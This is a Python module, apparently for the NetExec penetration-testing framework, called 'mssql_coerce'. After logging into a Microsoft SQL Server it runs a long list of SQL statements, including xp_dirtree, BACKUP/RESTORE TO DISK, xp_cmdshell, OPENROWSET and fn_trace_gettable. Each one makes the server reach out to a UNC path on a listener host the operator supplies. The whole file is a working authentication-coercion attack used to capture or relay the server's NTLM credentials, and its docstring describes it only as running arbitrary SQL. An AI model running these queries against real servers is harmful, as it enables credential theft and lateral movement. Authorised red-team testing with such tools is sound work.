import sys

class NXCModule:
    """Execute arbitrary SQL commands on the target MSSQL server"""

    name = "mssql_coerce"
    description = "Execute arbitrary SQL commands on the target MSSQL server"
    supported_protocols = ["mssql"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.mssql_conn = None
        self.context = None
        self.listener = None

    def options(self, context, module_options):
        """
        LISTENER       LISTENER for exploitation
        L              Alias for LISTENER
        """
        self.context = context
        self.listener = None
        if "LISTENER" in module_options:
            self.listener = module_options["LISTENER"]
        if "L" in module_options:
            self.listener = module_options["L"]

    def on_login(self, context, connection):
        if self.listener is None:
            context.log.error("LISTENER option is required!")
            sys.exit(1)
        self.context = context
        self.mssql_conn = connection.conn
        commands = [
          f"xp_dirtree '\\\\{self.listener}\\file';",
          f"xp_fileexist '\\\\{self.listener}\\file';",
          f"BACKUP LOG [TESTING] TO DISK = '\\\\{self.listener}\\file';",
          f"BACKUP DATABASE [TESTING] TO DISK = '\\\\{self.listener}\\file';",
          f"RESTORE LOG [TESTING] FROM DISK = '\\\\{self.listener}\\file';",
          f"RESTORE DATABASE [TESTING] FROM DISK = '\\\\{self.listener}\\file';",
          f"RESTORE HEADERONLY FROM DISK = '\\\\{self.listener}\\file';",
          f"RESTORE FILELISTONLY FROM DISK = '\\\\{self.listener}\\file';",
          f"RESTORE LABELONLY FROM DISK = '\\\\{self.listener}\\file';",
          f"RESTORE REWINDONLY FROM DISK = '\\\\{self.listener}\\file';",
          f"RESTORE VERIFYONLY FROM DISK = '\\\\{self.listener}\\file';",
          f"DBCC checkprimaryfile ('\\\\{self.listener}\\file');",
          f"CREATE ASSEMBLY HelloWorld FROM '\\\\{self.listener}\\file' WITH PERMISSION_SET = SAFE; GO ",
          f"sp_addextendedproc 'xp_hello','\\\\{self.listener}\\file';",
          f"CREATE CERTIFICATE testing123 FROM EXECUTABLE FILE = '\\\\{self.listener}\\file'; GO ",
          f"BACKUP CERTIFICATE test01 TO FILE = '\\\\{self.listener}\\file' WITH PRIVATE KEY (decryption by password = 'superpassword', FILE = '\\\\{self.listener}\\file', encryption by password = 'superpassword'); GO ",
          f"BACKUP MASTER KEY TO FILE = '\\\\{self.listener}\\file' ENCRYPTION BY PASSWORD = 'password'; GO ",
          f"BACKUP SERVICE MASTER KEY TO FILE = '\\\\{self.listener}\\file' ENCRYPTION BY PASSWORD = 'password'; GO ",
          f"RESTORE MASTER KEY FROM FILE = '\\\\{self.listener}\\file' DECRYPTION BY PASSWORD = 'password' ENCRYPTION BY PASSWORD = 'password'; GO ",
          f"RESTORE SERVICE MASTER KEY FROM FILE = '\\\\{self.listener}\\file' DECRYPTION BY PASSWORD = 'password'; GO ",
          f"CREATE TABLE #TEXTFILE (column1 NVARCHAR(100)); BULK INSERT #TEXTFILE FROM '\\\\{self.listener}\\file'; DROP TABLE #TEXTFILE;",
          f"CREATE TABLE #TEXTFILE (column1 NVARCHAR(100)); BULK INSERT #TEXTFILE FROM '\\\\{self.listener}\\file' WITH (FORMATFILE = '\\testing21\file'); DROP TABLE #TEXTFILE;",
          f"SELECT * FROM sys.fn_xe_file_target_read_file ('\\\\{self.listener}\\file','\\\\{self.listener}\\file',null,null); GO ",
          f"SELECT * FROM sys.fn_get_audit_file ('\\\\{self.listener}\\file','\\\\{self.listener}\\file',default,default); GO ",
          f"SELECT * INTO temp_trc FROM fn_trace_gettable('\\\\{self.listener}\\file.trc', default);",
          f"SELECT * FROM fn_trace_gettable('\\\\{self.listener}\\file.trc', default);",
          f"CREATE SERVER AUDIT TESTING TO FILE ( FILEPATH = '\\\\{self.listener}\\file'); GO ",
          f"sp_configure 'EKM provider enabled',1; RECONFIGURE; GO; CREATE CRYPTOGRAPHIC PROVIDER SecurityProvider FROM FILE = '\\\\{self.listener}\\file'; GO ",
          f"CREATE EXTERNAL FILE FORMAT myfileformat WITH (FORMATFILE = '\\\\{self.listener}\\file'); GO ",
          f"xp_subdirs '\\\\{self.listener}\\file';",
          f"xp_cmdshell 'dir \\\\{self.listener}\\file';",
          f"SELECT * FROM fn_dump_dblog(NULL,NULL,'DISK',1,'\\\\{self.listener}\\fakefile.bak',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);",
          f"SELECT * FROM OPENDATASOURCE('Microsoft.Jet.OLEDB.4.0','Data Source=\\\\{self.listener}\\file\\test.xls;Extended Properties=EXCEL 5.0')...[Sheet1$];",
          f"SELECT * FROM OPENROWSET('Microsoft.Jet.OLEDB.4.0','Excel 8.0;HDR=YES;Database=\\\\{self.listener}\\file\\test.xls','select * from [ProductList$]');",
          f"SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0','Excel 12.0 Xml;HDR=YES;Database=\\\\{self.listener}\\file\\test.xlsx','SELECT * FROM [ProductList$]');",
          f"SELECT * FROM sys.dm_os_file_exists('\\\\{self.listener}\\file\\test.xlsx');",
        ]
        for command in commands:
            try:
                result = self.mssql_conn.sql_query(command)
                self.context.log.debug(f"Executing command: {command}, Command result: {result}")
            except Exception as e:
                self.context.log.fail(f"Failed to execute command: {command}, Error: {e}")
        self.context.log.display("Commands executed successfully, check the listener for results")
